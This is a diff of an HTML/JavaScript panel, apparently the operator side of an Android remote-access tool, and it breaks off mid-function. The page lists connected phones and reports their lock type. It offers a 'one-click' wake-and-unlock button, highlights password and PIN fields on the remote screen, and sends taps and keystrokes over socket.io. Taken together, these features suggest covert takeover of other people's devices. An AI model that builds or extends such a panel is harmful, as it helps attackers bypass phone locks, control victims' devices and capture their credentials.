@@ -3,458 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Screen Control - Live View</title>
+    <title>Screen Control - Ultimate</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
         
-        body { 
-            font-family: 'Roboto', sans-serif; 
-            background-color: #121212; 
-            color: #e0e0e0; 
-            margin: 0; 
-            padding: 0; 
-            height: 100vh; 
-            overflow: hidden; 
-        }
+        body { font-family: 'Roboto', sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 0; height: 100vh; overflow: hidden; }
+        .view { display: none; width: 100%; height: 100%; }
+        .view.active { display: flex; }
+
+        /* डिवाइस सूची */
+        #device-list-view { flex-direction: column; }
+        .header { background-color: #1e1e1e; padding: 20px; text-align: center; border-bottom: 2px solid #00ff00; }
+        .header h1 { font-family: 'Orbitron', sans-serif; margin: 0; font-size: 2.5em; color: #00ff00; text-shadow: 0 0 10px #00ff00; }
+        #device-list-container { padding: 30px; overflow-y: auto; flex-grow: 1; }
+        #device-list { list-style: none; padding: 0; margin: 0; }
+        .device { background-color: #1e1e1e; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #555; padding: 20px; cursor: pointer; transition: all 0.3s ease; display: flex; justify-content: space-between; align-items: center; }
+        .device:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border-left-color: #00ff00; }
+        .device-name { font-size: 1.5em; font-weight: 700; }
+        .device-info { font-size: 1em; color: #aaa; }
+        .status-dot { height: 15px; width: 15px; background-color: #28a745; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #28a745; }
+        .lock-badge { background: #ff4444; color: white; padding: 2px 8px; border-radius: 10px; font-size: 0.8em; margin-left: 10px; }
+        .lock-badge.unlocked { background: #44ff44; }
+
+        /* कंट्रोल व्यू */
+        #control-view { flex-direction: column; }
+        .control-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #1e1e1e; border-bottom: 1px solid #333; flex-wrap: wrap; gap: 10px; }
+        #back-to-list-btn { background-color: #3f3f46; color: white; border: 1px solid #555; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 1em; }
+        #device-title { font-size: 1.2em; font-weight: bold; }
+        .lock-info { background: #2a2a2a; padding: 5px 10px; border-radius: 5px; font-size: 0.9em; }
         
-        /* Main Views */
-        .view { 
-            display: none; 
-            width: 100%; 
-            height: 100%; 
-        }
-        .view.active { 
-            display: flex; 
-            flex-direction: column;
-        }
+        .main-container { display: flex; flex-grow: 1; }
+        .screen-area { flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 15px; }
+        #screen-viewport { border: 8px solid #444; border-radius: 20px; background-color: #000; box-shadow: 0 0 20px rgba(0,0,0,0.5); overflow: hidden; }
+        #screen-container { position: relative; background-color: #000; transform-origin: top left; }
+        .screen-element { position: absolute; border: 1px solid rgba(0, 255, 255, 0.6); background-color: rgba(0, 139, 139, 0.2); box-sizing: border-box; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; padding: 2px; }
+        .element-text { color: white; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; }
         
-        /* Device List View */
-        #device-list-view { 
-            flex-direction: column; 
-        }
-        
-        .header { 
-            background-color: #1e1e1e; 
-            padding: 15px 20px; 
-            text-align: center; 
-            border-bottom: 2px solid #00ff00; 
-            flex-shrink: 0;
-        }
-        
-        .header h1 { 
-            font-family: 'Orbitron', sans-serif; 
-            margin: 0; 
-            font-size: 2em; 
-            color: #00ff00; 
-            text-shadow: 0 0 10px #00ff00; 
-        }
-        
-        #device-list-container { 
-            padding: 20px; 
-            overflow-y: auto; 
-            flex-grow: 1; 
-        }
-        
-        #device-list { 
-            list-style: none; 
-            padding: 0; 
-            margin: 0; 
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 15px;
-        }
-        
-        .device { 
-            background-color: #1e1e1e; 
-            border-radius: 10px; 
-            border-left: 5px solid #555; 
-            padding: 20px; 
-            cursor: pointer; 
-            transition: all 0.3s ease; 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-        }
-        
-        .device:hover { 
-            transform: translateY(-3px); 
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2); 
-            border-left-color: #00ff00; 
-        }
-        
-        .device-name { 
-            font-size: 1.3em; 
-            font-weight: 700; 
-        }
-        
-        .device-info { 
-            font-size: 0.9em; 
-            color: #aaa; 
-        }
-        
-        .status-dot { 
-            height: 15px; 
-            width: 15px; 
-            background-color: #28a745; 
-            border-radius: 50%; 
-            display: inline-block; 
-            box-shadow: 0 0 8px #28a745; 
-        }
-        
-        .lock-badge { 
-            background: #ff4444; 
-            color: white; 
-            padding: 2px 8px; 
-            border-radius: 10px; 
-            font-size: 0.8em; 
-            margin-left: 10px; 
-        }
-        
-        .lock-badge.unlocked { 
-            background: #44ff44; 
-        }
-        
-        /* Control View */
-        #control-view { 
-            flex-direction: column; 
-        }
-        
-        .control-header { 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-            padding: 10px 20px; 
-            background-color: #1e1e1e; 
-            border-bottom: 1px solid #333; 
-            flex-wrap: wrap; 
-            gap: 10px; 
-            flex-shrink: 0;
-        }
-        
-        #back-to-list-btn { 
-            background-color: #3f3f46; 
-            color: white; 
-            border: 1px solid #555; 
-            padding: 8px 15px; 
-            border-radius: 5px; 
-            cursor: pointer; 
-            font-size: 1em; 
-        }
-        
-        #device-title { 
-            font-size: 1.2em; 
-            font-weight: bold; 
-        }
-        
-        .lock-info { 
-            background: #2a2a2a; 
-            padding: 5px 10px; 
-            border-radius: 5px; 
-            font-size: 0.9em; 
-        }
-        
-        /* Screen View Toggle Buttons */
-        .screen-toggle-buttons {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .screen-toggle-btn {
-            background: #3f3f46;
-            color: white;
-            border: 1px solid #555;
-            padding: 8px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 0.9em;
-            transition: all 0.3s;
-        }
-        
-        .screen-toggle-btn:hover {
-            background: #555;
-        }
-        
-        .screen-toggle-btn.active {
-            background: #00ff00;
-            color: #000;
-            border-color: #00ff00;
-        }
-        
-        /* Main Container */
-        .main-container { 
-            display: flex; 
-            flex-grow: 1; 
-            min-height: 0;
-            overflow: hidden;
-        }
-        
-        .screen-area { 
-            flex-grow: 1; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            padding: 15px; 
-            position: relative;
-            overflow: auto;
-        }
-        
-        .screen-viewport {
-            border: 3px solid #444; 
-            border-radius: 10px; 
-            background-color: #000; 
-            box-shadow: 0 0 20px rgba(0,0,0,0.5); 
-            overflow: hidden; 
-            position: relative;
-            max-width: 95%;
-            max-height: 95%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .screen-container {
-            position: relative;
-            background-color: #000;
-            transform-origin: top left;
-            overflow: hidden;
-            max-width: 100%;
-            max-height: 100%;
-        }
-        
-        .screen-element {
-            position: absolute;
-            border: 1px solid rgba(0, 255, 255, 0.6);
-            background-color: rgba(0, 139, 139, 0.2);
-            box-sizing: border-box;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 2px;
-        }
-        
-        .element-text {
-            color: white;
-            font-size: 12px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            max-width: 100%;
-        }
-        
-        /* Live Screen Image */
-        .live-screen-image {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            background-color: #000;
-        }
-        
-        /* Clickable Overlay */
-        .clickable-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1000;
-        }
-        
-        .clickable-element {
-            position: absolute;
-            cursor: pointer;
-            border: 2px dashed rgba(0, 255, 0, 0.5);
-            background-color: rgba(0, 255, 0, 0.1);
-            transition: all 0.2s;
-            box-sizing: border-box;
-            pointer-events: all;
-        }
-        
-        .clickable-element:hover {
-            background-color: rgba(0, 255, 0, 0.3);
-            border: 2px solid rgba(0, 255, 0, 0.8);
-        }
-        
-        .all-controls { 
-            width: 80px; 
-            background-color: #1e1e1e; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: flex-start; 
-            gap: 12px; 
-            padding: 20px 10px;
-            flex-shrink: 0;
-            overflow-y: auto;
-        }
-        
-        .control-button { 
-            width: 55px; 
-            height: 55px; 
-            background-color: #3f3f46; 
-            border: 1px solid #555; 
-            color: white; 
-            border-radius: 50%; 
-            cursor: pointer; 
-            font-size: 24px; 
-            transition: background-color 0.2s; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            flex-shrink: 0;
-        }
-        
-        .control-button:hover { 
-            background-color: #555; 
-        }
-        
-        .divider { 
-            height: 1px; 
-            width: 80%; 
-            background-color: #444; 
-            margin: 10px 0; 
-        }
-        
-        /* Single Main Button */
+        .all-controls { width: 80px; background-color: #1e1e1e; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; padding: 10px; }
+        .control-button { width: 55px; height: 55px; background-color: #3f3f46; border: 1px solid #555; color: white; border-radius: 50%; cursor: pointer; font-size: 24px; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; }
+        .control-button:hover { background-color: #555; }
+        .divider { height: 1px; width: 80%; background-color: #444; margin: 10px 0; }
+
+        /* सिंगल मुख्य बटन */
         .single-main-btn { 
             background: linear-gradient(135deg, #0066cc, #0099ff);
             color: white;
             border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            font-size: 1.1em;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1.2em;
             font-weight: bold;
             cursor: pointer;
             box-shadow: 0 5px 15px rgba(0, 102, 204, 0.4);
             transition: all 0.3s;
             display: flex;
             align-items: center;
-            gap: 8px;
-            flex-shrink: 0;
+            gap: 10px;
         }
-        
         .single-main-btn:hover {
             background: linear-gradient(135deg, #0099ff, #00ccff);
-            transform: translateY(-2px);
+            transform: translateY(-3px);
             box-shadow: 0 8px 20px rgba(0, 153, 255, 0.6);
         }
-        
         .single-main-btn:active {
             transform: translateY(1px);
         }
         
-        /* Status Indicator */
-        .status-indicator {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 0.9em;
-            flex-shrink: 0;
+        /* कीबोर्ड बटन */
+        .keyboard-buttons { 
+            position: absolute; 
+            bottom: 20px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            background: rgba(0,0,0,0.9); 
+            padding: 15px; 
+            border-radius: 15px; 
+            border: 2px solid #00ff00;
+            display: none; 
+            z-index: 1000;
         }
-        
-        .live-indicator {
-            width: 10px;
-            height: 10px;
-            background-color: #ff4444;
-            border-radius: 50%;
-            animation: pulse 1s infinite;
-        }
-        
-        .live-indicator.active {
-            background-color: #44ff44;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        
-        /* Connection Status */
-        .connection-status {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 0.9em;
-            padding: 5px 10px;
-            border-radius: 5px;
-            background: #2a2a2a;
-        }
-        
-        .connection-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-        }
-        
-        .connection-dot.connected {
-            background-color: #44ff44;
-            box-shadow: 0 0 8px #44ff44;
-        }
-        
-        .connection-dot.disconnected {
-            background-color: #ff4444;
-            box-shadow: 0 0 8px #ff4444;
-        }
-        
-        /* Loading Spinner */
-        .loading-spinner {
-            display: none;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 1001;
-        }
-        
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-left-color: #00ff00;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        /* No Connection Message */
-        .no-connection {
-            display: none;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.8);
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            z-index: 1001;
-            color: white;
-            border: 2px solid #ff4444;
-        }
-        
-        .reconnect-btn {
-            background: #0099ff;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
-            margin-top: 10px;
-            cursor: pointer;
-        }
+        .key-row { display: flex; justify-content: center; margin: 5px 0; }
+        .key-btn { width: 45px; height: 45px; margin: 3px; background: #333; border: 1px solid #555; color: white; border-radius: 8px; cursor: pointer; font-size: 1.1em; }
+        .key-btn:hover { background: #444; }
+        .key-btn.special { background: #0066cc; }
+        .key-btn.enter { background: #00aa00; }
     </style>
 </head>
 <body>
 
     <div id="device-list-view" class="view active">
         <div class="header">
-            <h1>🔓 LIVE SCREEN CONTROL v4.0</h1>
-            <p style="margin: 5px 0; color: #aaa;">Real-time Live Screen Streaming • Full Screen Mode</p>
+            <h1>🔓 SCREEN CONTROL v2.0</h1>
+            <p style="margin: 5px 0; color: #aaa;">Auto-lock detection • One-click unlock</p>
         </div>
         <div id="device-list-container">
             <ul id="device-list"></ul>
@@ -466,55 +106,17 @@
             <button id="back-to-list-btn">← Back to List</button>
             <h2 id="device-title"></h2>
             <div class="lock-info" id="lock-status">Lock: Unknown</div>
-            
-            <!-- Screen Toggle Buttons -->
-            <div class="screen-toggle-buttons">
-                <button id="btn-black-screen" class="screen-toggle-btn active">
-                    📦 Black Screen
-                </button>
-                <button id="btn-live-screen" class="screen-toggle-btn">
-                    📱 Live Screen
-                </button>
-            </div>
-            
-            <div class="status-indicator">
-                <div id="live-indicator" class="live-indicator"></div>
-                <span id="stream-status">Live Stream: Off</span>
-            </div>
-            
-            <div class="connection-status">
-                <div id="connection-dot" class="connection-dot disconnected"></div>
-                <span id="connection-status-text">Disconnected</span>
-            </div>
-            
+            <!-- केवल एक ही मुख्य बटन -->
             <button id="btn-wake-unlock" class="single-main-btn">
                 ⚡ WAKE & UNLOCK
             </button>
         </div>
         <div class="main-container">
             <div class="screen-area">
-                <!-- Loading Spinner -->
-                <div id="loading-spinner" class="loading-spinner">
-                    <div class="spinner"></div>
-                    <div style="margin-top: 10px;">Loading screen...</div>
-                </div>
-                
-                <!-- No Connection Message -->
-                <div id="no-connection" class="no-connection">
-                    <div>📡 Connection Lost</div>
-                    <div style="font-size: 0.9em; margin-top: 5px;">Trying to reconnect...</div>
-                    <button id="reconnect-btn" class="reconnect-btn">Reconnect Now</button>
-                </div>
-                
-                <!-- Black Screen View (Default) -->
-                <div id="black-screen-viewport" class="screen-viewport" style="display: block;">
-                    <div id="black-screen-container" class="screen-container"></div>
-                </div>
-                
-                <!-- Live Screen View (Hidden by default) -->
-                <div id="live-screen-viewport" class="screen-viewport" style="display: none;">
-                    <img id="live-screen-image" class="live-screen-image" src="" alt="Live Screen" />
-                    <div id="live-clickable-overlay" class="clickable-overlay"></div>
+                <div id="screen-viewport">
+                    <div id="screen-container"></div>
+                    <!-- कीबोर्ड -->
+                    <div id="keyboard-buttons" class="keyboard-buttons"></div>
                 </div>
             </div>
             <div class="all-controls">
@@ -526,147 +128,45 @@
                 <button class="control-button" id="btn-back">⮌</button>
                 <button class="control-button" id="btn-home">⌂</button>
                 <button class="control-button" id="btn-recents">□</button>
-                <div class="divider"></div>
-                <button class="control-button" id="btn-start-stream">▶️</button>
-                <button class="control-button" id="btn-stop-stream">⏸️</button>
-                <div class="divider"></div>
-                <button class="control-button" id="btn-fullscreen">⬛</button>
-                <button class="control-button" id="btn-fit-screen">📐</button>
             </div>
         </div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io({
-            reconnection: true,
-            reconnectionAttempts: Infinity,
-            reconnectionDelay: 1000,
-            reconnectionDelayMax: 5000,
-            timeout: 20000
-        });
-        
+        const socket = io();
         const deviceListView = document.getElementById('device-list-view');
         const controlView = document.getElementById('control-view');
         const deviceListEl = document.getElementById('device-list');
-        const blackScreenContainer = document.getElementById('black-screen-container');
-        const liveScreenImage = document.getElementById('live-screen-image');
-        const liveClickableOverlay = document.getElementById('live-clickable-overlay');
+        const screenContainer = document.getElementById('screen-container');
+        const screenViewport = document.getElementById('screen-viewport');
         const deviceTitleEl = document.getElementById('device-title');
         const lockStatusEl = document.getElementById('lock-status');
         const backToListBtn = document.getElementById('back-to-list-btn');
         const wakeUnlockBtn = document.getElementById('btn-wake-unlock');
-        const btnBlackScreen = document.getElementById('btn-black-screen');
-        const btnLiveScreen = document.getElementById('btn-live-screen');
-        const btnStartStream = document.getElementById('btn-start-stream');
-        const btnStopStream = document.getElementById('btn-stop-stream');
-        const btnFullscreen = document.getElementById('btn-fullscreen');
-        const btnFitScreen = document.getElementById('btn-fit-screen');
-        const liveIndicator = document.getElementById('live-indicator');
-        const streamStatus = document.getElementById('stream-status');
-        const connectionDot = document.getElementById('connection-dot');
-        const connectionStatusText = document.getElementById('connection-status-text');
-        const loadingSpinner = document.getElementById('loading-spinner');
-        const noConnection = document.getElementById('no-connection');
-        const reconnectBtn = document.getElementById('reconnect-btn');
-        
-        const blackViewport = document.getElementById('black-screen-viewport');
-        const liveViewport = document.getElementById('live-screen-viewport');
+        const keyboardButtons = document.getElementById('keyboard-buttons');
 
         let devices = {};
         let activeDeviceId = null;
-        let currentScreenView = 'black'; // 'black' or 'live'
-        let isLiveStreaming = false;
-        let lastScreenData = null;
-        let lastLiveImage = null;
-        let screenScale = 1;
-        let isFullscreen = false;
-        let isConnectionStable = false;
-        let connectionRetries = 0;
-        const MAX_RETRIES = 10;
+        let currentKeyboardElement = null;
 
         function showView(viewId) {
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.getElementById(viewId).classList.add('active');
         }
 
-        // Connection status management
-        function updateConnectionStatus(connected) {
-            isConnectionStable = connected;
-            if (connected) {
-                connectionDot.className = 'connection-dot connected';
-                connectionStatusText.textContent = 'Connected';
-                connectionStatusText.style.color = '#44ff44';
-                noConnection.style.display = 'none';
-                connectionRetries = 0;
-            } else {
-                connectionDot.className = 'connection-dot disconnected';
-                connectionStatusText.textContent = 'Disconnected';
-                connectionStatusText.style.color = '#ff4444';
-                if (activeDeviceId) {
-                    noConnection.style.display = 'block';
-                }
-            }
-        }
-
-        function showLoading(show) {
-            loadingSpinner.style.display = show ? 'block' : 'none';
-        }
-
-        socket.on('connect', () => {
-            console.log('✅ Connected to server');
-            updateConnectionStatus(true);
-            socket.emit('admin_join');
-        });
-
-        socket.on('disconnect', (reason) => {
-            console.log('❌ Disconnected from server:', reason);
-            updateConnectionStatus(false);
-            
-            if (activeDeviceId && reason !== 'io client disconnect') {
-                connectionRetries++;
-                if (connectionRetries <= MAX_RETRIES) {
-                    console.log(`🔄 Attempting to reconnect (${connectionRetries}/${MAX_RETRIES})...`);
-                    setTimeout(() => {
-                        if (socket.disconnected) {
-                            socket.connect();
-                        }
-                    }, 2000);
-                }
-            }
-        });
-
-        socket.on('connect_error', (error) => {
-            console.log('🔌 Connection error:', error.message);
-            updateConnectionStatus(false);
-        });
-
-        socket.on('reconnect', (attemptNumber) => {
-            console.log(`✅ Reconnected after ${attemptNumber} attempts`);
-            updateConnectionStatus(true);
-            if (activeDeviceId) {
-                socket.emit('admin_join');
-            }
-        });
-
-        socket.on('reconnecting', (attemptNumber) => {
-            console.log(`🔄 Reconnecting (attempt ${attemptNumber})...`);
-        });
-
+        socket.on('connect', () => socket.emit('admin_join'));
         socket.on('device_list', (initialDevices) => { 
             deviceListEl.innerHTML = ''; 
             devices = {}; 
             initialDevices.forEach(addDeviceToList); 
         });
-        
         socket.on('new_device_joined', addDeviceToList);
-        
         socket.on('device_disconnected', (deviceId) => {
             const el = document.getElementById(`device-${deviceId}`);
             if (el) el.remove();
             delete devices[deviceId];
             if (activeDeviceId === deviceId) {
-                stopLiveStream();
                 showView('device-list-view');
                 activeDeviceId = null;
             }
@@ -702,149 +202,38 @@
             
             li.addEventListener('click', () => {
                 activeDeviceId = device.deviceId;
-                deviceTitleEl.textContent = `${device.deviceName} - Live Control`;
+                deviceTitleEl.textContent = `${device.deviceName} - Remote Control`;
                 lockStatusEl.textContent = `Lock: ${device.lockType || "none"}`;
-                blackScreenContainer.innerHTML = '';
-                liveScreenImage.src = '';
-                liveClickableOverlay.innerHTML = '';
+                screenContainer.innerHTML = '📡 Receiving screen data...';
                 showView('control-view');
-                
-                // Show loading
-                showLoading(true);
-                
-                // Auto start live stream after a short delay
-                setTimeout(() => {
-                    startLiveStream();
-                }, 500);
             });
             deviceListEl.appendChild(li);
-        }
-
-        function switchScreenView(viewType) {
-            currentScreenView = viewType;
-            
-            // Update button states
-            btnBlackScreen.classList.toggle('active', viewType === 'black');
-            btnLiveScreen.classList.toggle('active', viewType === 'live');
-            
-            // Show/hide screen containers
-            if (viewType === 'black') {
-                blackViewport.style.display = 'flex';
-                liveViewport.style.display = 'none';
-            } else {
-                blackViewport.style.display = 'none';
-                liveViewport.style.display = 'flex';
-                
-                // If we have a live image, show it
-                if (lastLiveImage) {
-                    liveScreenImage.src = 'data:image/jpeg;base64,' + lastLiveImage;
-                } else if (isLiveStreaming) {
-                    // Show loading if streaming but no image yet
-                    showLoading(true);
-                }
-            }
-            
-            // Adjust screen size
-            adjustScreenSize();
-        }
-
-        function adjustScreenSize() {
-            const viewport = currentScreenView === 'black' ? blackViewport : liveViewport;
-            const screenArea = document.querySelector('.screen-area');
-            
-            // Get available space
-            const availableWidth = screenArea.clientWidth - 40;
-            const availableHeight = screenArea.clientHeight - 40;
-            
-            // Calculate optimal size (90% of available space)
-            const targetWidth = Math.min(availableWidth * 0.9, 1200);
-            const targetHeight = Math.min(availableHeight * 0.9, 800);
-            
-            viewport.style.width = `${targetWidth}px`;
-            viewport.style.height = `${targetHeight}px`;
-            viewport.style.maxWidth = `${targetWidth}px`;
-            viewport.style.maxHeight = `${targetHeight}px`;
-            
-            // Update container scaling if we have screen data
-            if (lastScreenData) {
-                const remoteWidth = lastScreenData.screenWidth;
-                const remoteHeight = lastScreenData.screenHeight;
-                
-                // Calculate scale to fit viewport
-                const widthScale = targetWidth / remoteWidth;
-                const heightScale = targetHeight / remoteHeight;
-                screenScale = Math.min(widthScale, heightScale) * 0.95; // 95% to keep borders
-                
-                if (currentScreenView === 'black') {
-                    blackScreenContainer.style.transform = `scale(${screenScale})`;
-                    blackScreenContainer.style.transformOrigin = 'top left';
-                    blackScreenContainer.style.width = `${remoteWidth}px`;
-                    blackScreenContainer.style.height = `${remoteHeight}px`;
-                }
-                
-                // Update clickable overlay
-                if (lastScreenData.elements) {
-                    addClickableOverlay(lastScreenData.elements);
-                }
-            }
-        }
-
-        function startLiveStream() {
-            if (!activeDeviceId || isLiveStreaming) return;
-            
-            showLoading(true);
-            
-            socket.emit('command_to_device', {
-                deviceId: activeDeviceId,
-                action: 'start_live_stream',
-                payload: {}
-            });
-            
-            isLiveStreaming = true;
-            liveIndicator.classList.add('active');
-            streamStatus.textContent = 'Live Stream: On';
-            streamStatus.style.color = '#44ff44';
-            
-            // Hide loading after stream starts
-            setTimeout(() => {
-                showLoading(false);
-            }, 2000);
-        }
-
-        function stopLiveStream() {
-            if (!activeDeviceId || !isLiveStreaming) return;
-            
-            socket.emit('command_to_device', {
-                deviceId: activeDeviceId,
-                action: 'stop_live_stream',
-                payload: {}
-            });
-            
-            isLiveStreaming = false;
-            liveIndicator.classList.remove('active');
-            streamStatus.textContent = 'Live Stream: Off';
-            streamStatus.style.color = '#ff4444';
         }
 
         socket.on('screen_update', (data) => {
             if (data.deviceId !== activeDeviceId) return;
             
-            lastScreenData = data;
-            showLoading(false);
-            
             window.requestAnimationFrame(() => {
-                // Clear containers
-                blackScreenContainer.innerHTML = '';
-                
+                screenContainer.innerHTML = '';
                 const remoteWidth = data.screenWidth, remoteHeight = data.screenHeight;
+                const viewportHeight = screenViewport.clientHeight;
+                const scale = viewportHeight / remoteHeight;
                 
-                // Update lock status
+                screenViewport.style.width = (remoteWidth * scale) + 'px';
+                screenContainer.style.width = remoteWidth + 'px';
+                screenContainer.style.height = remoteHeight + 'px';
+                screenContainer.style.transform = `scale(${scale})`;
+                
+                // लॉक स्टेटस अपडेट
                 if (data.lockType) {
                     lockStatusEl.textContent = `Lock: ${data.lockType}`;
                     lockStatusEl.style.color = data.lockType !== "none" ? "#ff4444" : "#44ff44";
                 }
                 
-                // Create elements for black screen view
+                // कीबोर्ड हाइड
+                keyboardButtons.style.display = 'none';
+                currentKeyboardElement = null;
+                
                 data.elements.forEach(element => {
                     const el = document.createElement('div');
                     el.className = 'screen-element';
@@ -853,34 +242,56 @@
                     el.style.width = `${element.width}px`; 
                     el.style.height = `${element.height}px`;
                     
-                    // Special styling
-                    if (element.clickable) {
-                        el.style.borderColor = '#0099ff';
-                        el.style.backgroundColor = 'rgba(0, 153, 255, 0.3)';
+                    // विशेष स्टाइल
+                    if (element.isKeyboard) {
+                        el.style.borderColor = '#ff9900';
+                        el.style.backgroundColor = 'rgba(255, 153, 0, 0.3)';
+                    }
+                    if (element.isPassword) {
+                        el.style.borderColor = '#ff3333';
+                        el.style.backgroundColor = 'rgba(255, 51, 51, 0.2)';
                     }
                     if (element.editable) {
                         el.style.borderColor = '#33cc33';
                         el.style.backgroundColor = 'rgba(51, 204, 51, 0.2)';
                     }
-                    if (element.password) {
-                        el.style.borderColor = '#ff3333';
-                        el.style.backgroundColor = 'rgba(255, 51, 51, 0.2)';
+                    if (element.isNumber) {
+                        el.style.borderColor = '#9966ff';
+                        el.style.backgroundColor = 'rgba(153, 102, 255, 0.2)';
                     }
                     
                     const textEl = document.createElement('div');
                     textEl.className = 'element-text';
                     
-                    if (element.text) {
+                    if (element.contentDescription) {
+                        const desc = element.contentDescription.toLowerCase();
+                        if (desc.includes("more options")) { 
+                            textEl.textContent = '⋮'; 
+                            textEl.style.fontSize = '20px'; 
+                        }
+                        else if (desc.includes("navigate up") || desc.includes("drawer")) { 
+                            textEl.textContent = '≡'; 
+                            textEl.style.fontSize = '20px'; 
+                        }
+                        else if (desc.includes("keyboard")) {
+                            textEl.textContent = '⌨️'; 
+                            textEl.style.fontSize = '16px';
+                        }
+                        else if (element.text) {
+                            textEl.textContent = element.text;
+                        } else {
+                            textEl.textContent = element.contentDescription;
+                        }
+                    } else if (element.text) {
                         textEl.textContent = element.text;
-                    } else if (element.contentDescription) {
-                        textEl.textContent = element.contentDescription;
                     } else if (element.className) {
-                        textEl.textContent = element.className.split('.').pop();
+                        const shortName = element.className.split('.').pop();
+                        textEl.textContent = shortName.length > 10 ? shortName.substring(0, 8) + '..' : shortName;
                     }
                     
                     el.appendChild(textEl);
                     
-                    // Click event for BLACK SCREEN
+                    // क्लिक इवेंट
                     el.addEventListener('click', () => {
                         const tapX = Math.round(element.x + (element.width / 2));
                         const tapY = Math.round(element.y + (element.height / 2));
@@ -890,164 +301,64 @@
                             action: 'touch_command', 
                             payload: { x: tapX, y: tapY } 
                         });
+                        
+                        // कीबोर्ड शो करें
+                        if (element.editable || element.isKeyboard || element.isNumber) {
+                            currentKeyboardElement = element;
+                            showVirtualKeyboard(element);
+                        }
                     });
                     
-                    blackScreenContainer.appendChild(el);
+                    screenContainer.appendChild(el);
                 });
-                
-                // Adjust screen size
-                adjustScreenSize();
             });
         });
 
-        socket.on('live_screen', (data) => {
-            if (data.deviceId !== activeDeviceId) return;
+        function showVirtualKeyboard(element) {
+            keyboardButtons.innerHTML = '';
+            keyboardButtons.style.display = 'block';
             
-            lastLiveImage = data.liveImage;
-            showLoading(false);
+            // सरल कीबोर्ड
+            const keyboardLayout = [
+                ['1','2','3','4','5','6','7','8','9','0'],
+                ['q','w','e','r','t','y','u','i','o','p'],
+                ['a','s','d','f','g','h','j','k','l'],
+                ['z','x','c','v','b','n','m','⌫'],
+                ['space','enter']
+            ];
             
-            if (currentScreenView === 'live') {
-                // Update live screen image
-                liveScreenImage.src = 'data:image/jpeg;base64,' + data.liveImage;
+            keyboardLayout.forEach(row => {
+                const rowDiv = document.createElement('div');
+                rowDiv.className = 'key-row';
                 
-                // Add clickable overlay based on last screen data
-                if (lastScreenData && lastScreenData.elements) {
-                    addClickableOverlay(lastScreenData.elements);
-                }
-            }
-        });
-
-        function addClickableOverlay(elements) {
-            // Clear existing overlay
-            liveClickableOverlay.innerHTML = '';
-            
-            if (!elements || !lastScreenData) return;
-            
-            const remoteWidth = lastScreenData.screenWidth;
-            const remoteHeight = lastScreenData.screenHeight;
-            
-            // Create clickable elements overlay for LIVE SCREEN
-            elements.forEach(element => {
-                if (element.clickable || element.editable || element.password) {
-                    const clickableEl = document.createElement('div');
-                    clickableEl.className = 'clickable-element';
+                row.forEach(key => {
+                    const keyBtn = document.createElement('button');
+                    keyBtn.className = 'key-btn';
+                    keyBtn.textContent = key;
                     
-                    // Calculate scaled position and size
-                    const scaledX = element.x * screenScale;
-                    const scaledY = element.y * screenScale;
-                    const scaledWidth = element.width * screenScale;
-                    const scaledHeight = element.height * screenScale;
+                    if (key === '⌫') keyBtn.classList.add('special');
+                    if (key === 'enter') keyBtn.classList.add('enter');
                     
-                    clickableEl.style.left = `${scaledX}px`;
-                    clickableEl.style.top = `${scaledY}px`;
-                    clickableEl.style.width = `${scaledWidth}px`;
-                    clickableEl.style.height = `${scaledHeight}px`;
-                    
-                    // Click event for LIVE SCREEN
-                    clickableEl.addEventListener('click', (e) => {
-                        e.stopPropagation();
+                    keyBtn.onclick = () => {
